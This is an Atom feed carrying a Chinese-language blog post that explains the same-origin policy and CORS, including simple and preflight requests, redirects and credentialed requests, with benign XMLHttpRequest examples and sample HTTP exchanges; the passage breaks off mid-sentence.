<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Fxizenta</title>
  <icon>https://www.gravatar.com/avatar/4228837cba43fcbe7a475443e3f4ec19</icon>
  <subtitle>太阳尚远，但必有太阳</subtitle>
  <link href="http://fxizenta.github.io/atom.xml" rel="self"/>
  
  <link href="http://fxizenta.github.io/"/>
  <updated>2021-05-06T12:16:15.965Z</updated>
  <id>http://fxizenta.github.io/</id>
  
  <author>
    <name>Fxizenta</name>
    <email>fxizenta14@gmail.com</email>
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>同源策略和CORS</title>
    <link href="http://fxizenta.github.io/2021/05/06/same_source_and_cors/"/>
    <id>http://fxizenta.github.io/2021/05/06/same_source_and_cors/</id>
    <published>2021-05-06T12:07:07.000Z</published>
    <updated>2021-05-06T12:16:15.965Z</updated>
    
    <content type="html"><![CDATA[<h1 id="同源策略和CORS"><a href="#同源策略和CORS" class="headerlink" title="同源策略和CORS"></a>同源策略和CORS</h1><h1 id="同源策略"><a href="#同源策略" class="headerlink" title="同源策略"></a>同源策略</h1><p>同源策略是一种安全策略，用于限制origin的文档或者文档所加载的脚本如何同另外一个源进行交互，用于帮助阻隔恶意文档，减少可能被攻击的媒介。</p><h2 id="同源的定义"><a href="#同源的定义" class="headerlink" title="同源的定义"></a>同源的定义</h2><p>这个方案也被称为“协议/主机/端口元组” </p><p>例如</p><p><a href="http://store.company.com/dir/page.html">http://store.company.com/dir/page.html</a> 的源进行对比的示例:</p><p><a href="https://www.notion.so/fb5ebd5f1849470383b0bede2e1fbd69">对比表</a></p><h2 id="源的继承"><a href="#源的继承" class="headerlink" title="源的继承"></a>源的继承</h2><p>在页面中通过 about:blank 或 javascript: URL 执行的脚本会继承打开该 URL 的文档的源，因为这些类型的 URLs 没有包含源服务器的相关信息。</p><p>例如，about:blank通常作为父脚本写入内容的新的空白弹出窗口的 URL（例如，通过 Window.open() ）。 如果此弹出窗口也包含 JavaScript，则该脚本将从创建它的脚本那里继承对应的源。</p><h2 id="如何允许跨源访问"><a href="#如何允许跨源访问" class="headerlink" title="如何允许跨源访问"></a>如何允许跨源访问</h2><p>可以使用CORS来允许跨源访问，CORS是HTTP的一部分，它允许服务端来指定哪些主机可以从这个服务端加载资源</p><h2 id="如何阻止跨源访问"><a href="#如何阻止跨源访问" class="headerlink" title="如何阻止跨源访问"></a>如何阻止跨源访问</h2><p>1.阻止跨域写操作，利用一个CSRF token作为请求中的一个不可推测的标记，使用这个标记来阻止页面的跨站读操作。</p><p>2.阻止资源的跨站读取，需要保证该资源是不可嵌入的。阻止嵌入行为是必须的，因为嵌入资源通常向其暴露信息。</p><p>3.阻止跨站嵌入，需要确保你的资源不能通过以上列出的可嵌入资源格式使用。因为浏览器可能不会遵守Content-Type头部定义的类型，例如HTML文档中的<script>标记</p><h2 id="Window"><a href="#Window" class="headerlink" title="Window"></a>Window</h2><p>允许以下对Window属性的跨源访问：</p><h3 id="方法"><a href="#方法" class="headerlink" title="方法"></a><strong>方法</strong></h3><p>window.blur</p><p>window.close</p><p>window.focus</p><p>window.postMessage</p><p><a href="https://www.notion.so/e4137d799fc643038c86f7d47f91ab19">属性</a></p><p>部分某些浏览器允许访问除了以上更多的属性</p><h2 id="Location"><a href="#Location" class="headerlink" title="Location"></a>Location</h2><p>允许以下对Location属性的跨源访问：</p><hr><p><code>[location.replace](https://developer.mozilla.org/zh-CN/docs/Web/API/Location/replace)</code></p><hr><p><a href="https://www.notion.so/11ce487d19354029ad7bac86ef58d898">Untitled</a></p><p>同上某些浏览器允许访问除上述外更多的属性</p><h1 id="CORS"><a href="#CORS" class="headerlink" title="CORS"></a>CORS</h1><p>Cross-origin resource sharing (CORS) is a mechanism that allows restricted resources (e.g. fonts) on a web page to be requested from another domain outside the domain from which the first resource was served. A web page may freely embed cross-origin images, stylesheets, scripts, iframes, and videos. Certain “cross-domain” requests, notably Ajax requests, are forbidden by default by the same-origin security policy. Cross-origin resource sharing </p><p>(CORS)是一种机制，它允许一个网页上受限制的资源(例如字体)，从提供一手资源的域名以外的另一个域名请求跨来源资源共享。 一个网页可以自由地嵌入跨来源的图片、样式表、脚本、 iframe 和视频。 默认情况下，同源安全策略禁止某些“跨域”请求，特别是 Ajax 请求。</p><p>eg:运行在 <a href="http://domain-a.com/">http://domain-a.com</a> 的JavaScript代码使用XMLHttpRequest来发起一个到 <a href="https://domain-b.com/data.json">https://domain-b.com/data.json</a> 的请求。</p><p>出于安全性，XMLHttpRequest和Fetch API遵循同源策略。 这意味着使用这些API的Web应用程序只能从加载应用程序的同一个域请求HTTP资源，除非响应报文包含了正确CORS响应头。</p><p><img src="https://myimage-1303975616.cos.ap-guangzhou.myqcloud.com/img/2021tyandcors1.png"></p><h2 id="什么情况下需要CORS？"><a href="#什么情况下需要CORS？" class="headerlink" title="什么情况下需要CORS？"></a>什么情况下需要CORS？</h2><p>1.XMLHttpRequest或Fetch发起的跨源HTTP请求。</p><p>2.Web字体（在CSS中通过@Font-face使用跨源字体资源）</p><p>3.WebGL贴图</p><p>4.使用drawImage将image/video 画面绘制到canvas</p><h2 id="功能概述"><a href="#功能概述" class="headerlink" title="功能概述"></a>功能概述</h2><p>跨源资源共享标准新增了一组HTTP首部字段，允许服务器声明哪些源站通过浏览器有权限访问哪些资源，另外，规范要求，对那些可能对服务器数据产生副作用的HTTP请求方法（特别是GET外的那些方法），浏览器<strong>必须先用OPTIONS方法发起一个预检请求</strong>，从而来获知服务器是否允许跨源请求，服务器确认允许之后，才发起实际的HTTP请求。在预请求中服务器也通知客户端，是否需要携带身份凭证（例如Cookies）</p><p>同时出于安全考虑，CORS请求失败产生错误是无法在JS代码层面是无法获知具体是哪里出了问题，你只能查看浏览器的控制台以得知具体是哪里出现了错误。</p><h2 id="访问控制场景示例"><a href="#访问控制场景示例" class="headerlink" title="访问控制场景示例"></a>访问控制场景示例</h2><h3 id="简单请求"><a href="#简单请求" class="headerlink" title="简单请求"></a>简单请求</h3><p>部分请求不会触发CORS预检请求，我们将这样的请求称为“简单请求”。若满足所有下述条件，则该请求可视为“简单请求”：</p><ul><li>使用下列方法之一：<ul><li><code>[GET](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods/GET)</code></li><li><code>[HEAD](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods/HEAD)</code></li><li><code>[POST](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods/POST)</code></li></ul></li><li>除了被用户代理自动设置的首部字段（例如 <code>[Connection](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Connection)</code> ，<code>[User-Agent](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/User-Agent)</code>）和在 Fetch 规范中定义为 <a href="https://fetch.spec.whatwg.org/#forbidden-header-name">禁用首部名称</a> 的其他首部，允许人为设置的字段为 Fetch 规范定义的 <a href="https://fetch.spec.whatwg.org/#cors-safelisted-request-header">对 CORS 安全的首部字段集合</a>。该集合为：<ul><li><code>[Accept](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Accept)</code></li><li><code>[Accept-Language](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Accept-Language)</code></li><li><code>[Content-Language](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Language)</code></li><li><code>[Content-Type](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Type)</code> （需要注意额外的限制）</li><li><code>[DPR](https://httpwg.org/http-extensions/client-hints.html#dpr)</code></li><li><code>[Downlink](https://httpwg.org/http-extensions/client-hints.html#downlink)</code></li><li><code>[Save-Data](https://httpwg.org/http-extensions/client-hints.html#save-data)</code></li><li><code>[Viewport-Width](https://httpwg.org/http-extensions/client-hints.html#viewport-width)</code></li><li><code>[Width](https://httpwg.org/http-extensions/client-hints.html#width)</code></li></ul></li><li><code>[Content-Type](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Type)</code> 的值仅限于下列三者之一：<ul><li><code>text/plain</code></li><li><code>multipart/form-data</code></li><li><code>application/x-www-form-urlencoded</code></li></ul></li><li>请求中的任意<code>XMLHttpRequestUpload</code> 对象均没有注册任何事件监听器；<code>XMLHttpRequestUpload</code> 对象可以使用 <code>[XMLHttpRequest.upload](https://developer.mozilla.org/zh-CN/docs/Web/API/XMLHttpRequest/upload)</code> 属性访问。</li><li>请求中没有使用 <code>[ReadableStream](https://developer.mozilla.org/zh-CN/docs/Web/API/ReadableStream)</code> 对象。</li></ul><p><strong>注意：</strong>这些跨站点请求与浏览器发出的其他跨站点请求并无二致。如果服务器未返回正确的响应首部，则请求方不会收到任何数据。因此，那些不允许跨站请求的网站无需为这一新的HTTp访问特性担心。</p><p>例如站点<a href="http://foo.example/">http://foo.example</a> 的网页应用想要访问 <a href="http://bar.other/">http://bar.other</a> 的资源。<a href="http://foo.example/">http://foo.example</a> 的网页中可能包含类似于下面的 JavaScript 代码：</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> invocation = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line"><span class="keyword">var</span> url = <span class="string">&#x27;http://bar.other/resources/public-data/&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">callOtherDomain</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(invocation) &#123;</span><br><span class="line">    invocation.open(<span class="string">&#x27;GET&#x27;</span>, url, <span class="literal">true</span>);</span><br><span class="line">    invocation.onreadystatechange = handler;</span><br><span class="line">    invocation.send();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>客户端和服务器之间使用CORS首部字段来处理权限：</p><p><img src="https://myimage-1303975616.cos.ap-guangzhou.myqcloud.com/img/2021tyandcors2.png"></p><p>请求报文和响应报文如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;resources&#x2F;public-data&#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: bar.other</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Macintosh; U; Intel Mac OS X 10.5; en-US; rv:1.9.1b3pre) Gecko&#x2F;20081130 Minefield&#x2F;3.1b3pre</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: en-us,en;q&#x3D;0.5</span><br><span class="line">Accept-Encoding: gzip,deflate</span><br><span class="line">Accept-Charset: ISO-8859-1,utf-8;q&#x3D;0.7,*;q&#x3D;0.7</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Referer: http:&#x2F;&#x2F;foo.example&#x2F;examples&#x2F;access-control&#x2F;simpleXSInvocation.html</span><br><span class="line">Origin: http:&#x2F;&#x2F;foo.example</span><br><span class="line"></span><br><span class="line">HTTP&#x2F;1.1 200 OK</span><br><span class="line">Date: Mon, 01 Dec 2008 00:23:53 GMT</span><br><span class="line">Server: Apache&#x2F;2.0.61</span><br><span class="line">Access-Control-Allow-Origin: *</span><br><span class="line">Keep-Alive: timeout&#x3D;2, max&#x3D;100</span><br><span class="line">Connection: Keep-Alive</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line">Content-Type: application&#x2F;xml</span><br><span class="line"></span><br><span class="line">[XML Data]</span><br></pre></td></tr></table></figure><p>请求的首部字段Origin表明该请求来自<a href="http://foo.example../">http://foo.example.。</a></p><p>在响应报文中，响应首部字段</p><p><code>[Access-Control-Allow-Origin](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Access-Control-Allow-Origin)</code>（第 16 行）。使用 <code>[Origin](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Origin)</code> 和 <code>[Access-Control-Allow-Origin](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Access-Control-Allow-Origin)</code> 就能完成最简单的访问控制。本例中，服务端返回的 <code>Access-Control-Allow-Origin: *</code> 表明，该资源可以被<strong>任意</strong>外域访问。如果服务端仅允许来自 <a href="http://foo.example/">http://foo.example</a> 的访问，该首部字段的内容如下：</p><p><code>Access-Control-Allow-Origin: http://foo.example</code></p><p>这样的话，除了</p><p><a href="http://foo.example/">http://foo.example</a>，其它外域均不能访问该资源（该策略由请求首部中的 ORIGIN 字段定义，见第10行）。Access-Control-Allow-Origin 应当为 * 或者包含由 Origin 首部字段所指明的域名。</p><h3 id="预检请求"><a href="#预检请求" class="headerlink" title="预检请求"></a>预检请求</h3><p>与前述简单请求不同，“需预检的请求”要求必须首先使用 <code>[OPTIONS](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods/OPTIONS)</code>   方法发起一个预检请求到服务器，以获知服务器是否允许该实际请求。”预检请求“的使用，可以避免跨域请求对服务器的用户数据产生未预期的影响。</p><p>如下是一个需要执行预检请求的 HTTP 请求：</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> invocation = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line"><span class="keyword">var</span> url = <span class="string">&#x27;http://bar.other/resources/post-here/&#x27;</span>;</span><br><span class="line"><span class="keyword">var</span> body = <span class="string">&#x27;&lt;?xml version=&quot;1.0&quot;?&gt;&lt;person&gt;&lt;name&gt;Arun&lt;/name&gt;&lt;/person&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">callOtherDomain</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(invocation)</span><br><span class="line">    &#123;</span><br><span class="line">      invocation.open(<span class="string">&#x27;POST&#x27;</span>, url, <span class="literal">true</span>);</span><br><span class="line">      invocation.setRequestHeader(<span class="string">&#x27;X-PINGOTHER&#x27;</span>, <span class="string">&#x27;pingpong&#x27;</span>);</span><br><span class="line">      invocation.setRequestHeader(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="string">&#x27;application/xml&#x27;</span>);</span><br><span class="line">      invocation.onreadystatechange = handler;</span><br><span class="line">      invocation.send(body);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">......</span><br></pre></td></tr></table></figure><p>上面的代码使用POSt请求发送一个XML文档，该请求包含了一个自定义的请求首部字段（X-PINGOTHER：pingpong）。另外，请求的Content-Type为application/xml.因此，该请求需要首先发出预检请求。</p><p><img src="https://myimage-1303975616.cos.ap-guangzhou.myqcloud.com/img/2021tyandcors3.png"></p><p>预检请求的请求包和响应包</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">OPTIONS &#x2F;resources&#x2F;post-here&#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: bar.other</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Macintosh; U; Intel Mac OS X 10.5; en-US; rv:1.9.1b3pre) Gecko&#x2F;20081130 Minefield&#x2F;3.1b3pre</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: en-us,en;q&#x3D;0.5</span><br><span class="line">Accept-Encoding: gzip,deflate</span><br><span class="line">Accept-Charset: ISO-8859-1,utf-8;q&#x3D;0.7,*;q&#x3D;0.7</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Origin: http:&#x2F;&#x2F;foo.example</span><br><span class="line">Access-Control-Request-Method: POST</span><br><span class="line">Access-Control-Request-Headers: X-PINGOTHER, Content-Type</span><br><span class="line"></span><br><span class="line">HTTP&#x2F;1.1 200 OK</span><br><span class="line">Date: Mon, 01 Dec 2008 01:15:39 GMT</span><br><span class="line">Server: Apache&#x2F;2.0.61 (Unix)</span><br><span class="line">Access-Control-Allow-Origin: http:&#x2F;&#x2F;foo.example</span><br><span class="line">Access-Control-Allow-Methods: POST, GET, OPTIONS</span><br><span class="line">Access-Control-Allow-Headers: X-PINGOTHER, Content-Type</span><br><span class="line">Access-Control-Max-Age: 86400</span><br><span class="line">Vary: Accept-Encoding, Origin</span><br><span class="line">Content-Encoding: gzip</span><br><span class="line">Content-Length: 0</span><br><span class="line">Keep-Alive: timeout&#x3D;2, max&#x3D;100</span><br><span class="line">Connection: Keep-Alive</span><br><span class="line">Content-Type: text&#x2F;plain</span><br></pre></td></tr></table></figure><p>之后发送的实际请求</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;resources&#x2F;post-here&#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: bar.other</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Macintosh; U; Intel Mac OS X 10.5; en-US; rv:1.9.1b3pre) Gecko&#x2F;20081130 Minefield&#x2F;3.1b3pre</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: en-us,en;q&#x3D;0.5</span><br><span class="line">Accept-Encoding: gzip,deflate</span><br><span class="line">Accept-Charset: ISO-8859-1,utf-8;q&#x3D;0.7,*;q&#x3D;0.7</span><br><span class="line">Connection: keep-alive</span><br><span class="line">X-PINGOTHER: pingpong</span><br><span class="line">Content-Type: text&#x2F;xml; charset&#x3D;UTF-8</span><br><span class="line">Referer: http:&#x2F;&#x2F;foo.example&#x2F;examples&#x2F;preflightInvocation.html</span><br><span class="line">Content-Length: 55</span><br><span class="line">Origin: http:&#x2F;&#x2F;foo.example</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line"></span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;&lt;person&gt;&lt;name&gt;Arun&lt;&#x2F;name&gt;&lt;&#x2F;person&gt;</span><br><span class="line"></span><br><span class="line">HTTP&#x2F;1.1 200 OK</span><br><span class="line">Date: Mon, 01 Dec 2008 01:15:40 GMT</span><br><span class="line">Server: Apache&#x2F;2.0.61 (Unix)</span><br><span class="line">Access-Control-Allow-Origin: http:&#x2F;&#x2F;foo.example</span><br><span class="line">Vary: Accept-Encoding, Origin</span><br><span class="line">Content-Encoding: gzip</span><br><span class="line">Content-Length: 235</span><br><span class="line">Keep-Alive: timeout&#x3D;2, max&#x3D;99</span><br><span class="line">Connection: Keep-Alive</span><br><span class="line">Content-Type: text&#x2F;plain</span><br><span class="line"></span><br><span class="line">[Some GZIP&#39;d payload]</span><br></pre></td></tr></table></figure><p>浏览器检测到从js中发起的请求需要被预检，于是先发送了一个OPTIONS方法的“预检请求”。</p><p>预检请求中同时携带了下面两个首部字段</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Access-Control-Request-Method: POST</span><br><span class="line">Access-Control-Request-Headers: X-PINGOTHER, Content-Type</span><br></pre></td></tr></table></figure><p>首部字段 Access-Control-Request-Method 告知服务器，实际请求将使用 POST 方法。首部字段 Access-Control-Request-Headers 告知服务器，实际请求将携带两个自定义请求首部字段：X-PINGOTHER 与 Content-Type。服务器据此决定，该实际请求是否被允许。</p><p>下面是需要注意的重点内容：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Access-Control-Allow-Origin: http:&#x2F;&#x2F;foo.example</span><br><span class="line">Access-Control-Allow-Methods: POST, GET, OPTIONS</span><br><span class="line">Access-Control-Allow-Headers: X-PINGOTHER, Content-Type</span><br><span class="line">Access-Control-Max-Age: 86400</span><br></pre></td></tr></table></figure><p>首部字段 <code>Access-Control-Allow-Methods</code> 表明服务器允许客户端使用 <code>POST,</code> <code>GET</code> 和 <code>OPTIONS</code> 方法发起请求。该字段与 <a href="https://www.w3.org/Protocols/rfc2616/rfc2616-sec14.html#sec14.7">HTTP/1.1 Allow: response header</a> 类似，但仅限于在需要访问控制的场景中使用。</p><p>首部字段 <code>Access-Control-Allow-Headers</code> 表明服务器允许请求中携带字段 <code>X-PINGOTHER</code> 与 <code>Content-Type</code>。与 <code>Access-Control-Allow-Methods</code> 一样，<code>Access-Control-Allow-Headers</code> 的值为逗号分割的列表。</p><p>最后，首部字段 <code>Access-Control-Max-Age</code> 表明该响应的有效时间为 86400 秒，也就是 24 小时。在有效时间内，浏览器无须为同一请求再次发起预检请求。请注意，浏览器自身维护了一个最大有效时间，如果该首部字段的值超过了最大有效时间，将不会生效。</p><h3 id="预检请求与重定向"><a href="#预检请求与重定向" class="headerlink" title="预检请求与重定向"></a>预检请求与重定向</h3><p>大多数浏览器不支持对于预检请求的重定向，浏览器将报告错误</p><blockquote><p>The request was redirected to ‘<a href="https://example.com/foo&#39;">https://example.com/foo&#39;</a>, which is disallowed for cross-origin requests that require preflight</p></blockquote><blockquote><p>Request requires preflight, which is disallowed to follow cross-origin redirect</p></blockquote><p>CORS最初是允许该行为的，<strong>不过在后续的修订中废弃了这一要求</strong></p><p>有两种方法对上述报错行为进行规避</p><ul><li>在服务端去掉对预检请求的重定向；</li><li>将实际请求变成一个简单请求。</li></ul><p>如果使用以上两种方法存在困难，我们仍有其他方法：</p><ul><li>发出一个简单请求（使用 <a href="https://developer.mozilla.org/en-US/docs/Web/API/Response/url">Response.url</a> 或 <a href="https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest/responseURL">XHR.responseURL</a>）以判断真正的预检请求会返回什么地址。</li><li>发出另一个请求（真正的请求），使用在上一步通过<a href="https://developer.mozilla.org/en-US/docs/Web/API/Response/url">Response.url</a> 或 <a href="https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest/responseURL">XMLHttpRequest.responseURL</a>获得的URL。</li></ul><p>注意：如果请求是由于存在 Authorization 字段而引发了预检请求，则这一方法将无法使用。这种情况只能由服务端进行更改。</p><h2 id="附带身份凭证的请求"><a href="#附带身份凭证的请求" class="headerlink" title="附带身份凭证的请求"></a>附带身份凭证的请求</h2><p><code>[XMLHttpRequest](https://developer.mozilla.org/zh-CN/docs/Web/API/XMLHttpRequest)</code> 或 <a href="https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API">Fetch</a> 与 CORS 的一个有趣的特性是，可以基于  <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies">HTTP cookies</a> 和 HTTP 认证信息发送身份凭证。一般而言，对于跨源 <code>[XMLHttpRequest](https://developer.mozilla.org/zh-CN/docs/Web/API/XMLHttpRequest)</code> 或 <a href="https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API">Fetch</a> 请求，浏览器<strong>不会</strong>发送身份凭证信息。如果要发送凭证信息，需要设置 <code>[XMLHttpRequest](https://developer.mozilla.org/en-US/DOM/XMLHttpRequest)</code> 的某个特殊标志位。</p><p>本例中，<a href="http://foo.example/">http://foo.example</a> 的某脚本向 <a href="http://bar.other/">http://bar.other</a> 发起一个GET 请求，并设置 Cookies：</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> invocation = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line"><span class="keyword">var</span> url = <span class="string">&#x27;http://bar.other/resources/credentialed-content/&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">callOtherDomain</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(invocation) &#123;</span><br><span class="line">    invocation.open(<span class="string">&#x27;GET&#x27;</span>, url, <span class="literal">true</span>);</span><br><span class="line">    invocation.withCredentials = <span class="literal">true</span>;</span><br><span class="line">    invocation.onreadystatechange = handler;</span><br><span class="line">    invocation.send();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>XMLHttpRequest 的 withCredentials 标志设置为 true，从而向服务器发送 Cookies。因为这是一个简单 GET 请求，所以浏览器不会对其发起“预检请求”。但是，如果服务器端的响应中未携带 Access-Control-Allow-Credentials: true ，浏览器将不会把响应内容返回给请求的发送者。</p><p><img src="https://myimage-1303975616.cos.ap-guangzhou.myqcloud.com/img/2021tyandcors4.png"></p><p>请求包和响应包如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;resources&#x2F;access-control-with-credentials&#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: bar.other</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Macintosh; U; Intel Mac OS X 10.5; en-US; rv:1.9.1b3pre) Gecko&#x2F;20081130 Minefield&#x2F;3.1b3pre</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: en-us,en;q&#x3D;0.5</span><br><span class="line">Accept-Encoding: gzip,deflate</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Referer: http:&#x2F;&#x2F;foo.example&#x2F;examples&#x2F;credential.html</span><br><span class="line">Origin: http:&#x2F;&#x2F;foo.example</span><br><span class="line">Cookie: pageAccess&#x3D;2</span><br><span class="line"></span><br><span class="line">HTTP&#x2F;1.1 200 OK</span><br><span class="line">Date: Mon, 01 Dec 2008 01:34:52 GMT</span><br><span class="line">Server: Apache&#x2F;2</span><br><span class="line">Access-Control-Allow-Origin: http:&#x2F;&#x2F;foo.example</span><br><span class="line">Access-Control-Allow-Credentials: true</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Set-Cookie: pageAccess&#x3D;3; expires&#x3D;Wed, 31-Dec-2008 01:34:53 GMT</span><br><span class="line">Vary: Accept-Encoding, Origin</span><br><span class="line">Content-Encoding: gzip</span><br><span class="line">Content-Length: 106</span><br><span class="line">Keep-Alive: timeout&#x3D;2, max&#x3D;100</span><br><span class="line">Connection: Keep-Alive</span><br><span class="line">Content-Type: text&#x2F;plain</span><br><span class="line"></span><br><span class="line">[text&#x2F;plain payload]</span><br></pre></td></tr></table></figure><p>即使指定了Cookie的相关信息，如果bar.other的响应中缺失Access-Control-Allow-Credentials: true,则响应内容也不会返回给发起请求者</p><h3 id="附带身份凭证的请求与通配符"><a href="#附带身份凭证的请求与通配符" class="headerlink" title="附带身份凭证的请求与通配符"></a>附带身份凭证的请求与通配符</h3><p>对于附带身份凭证的请求，服务器不得设置 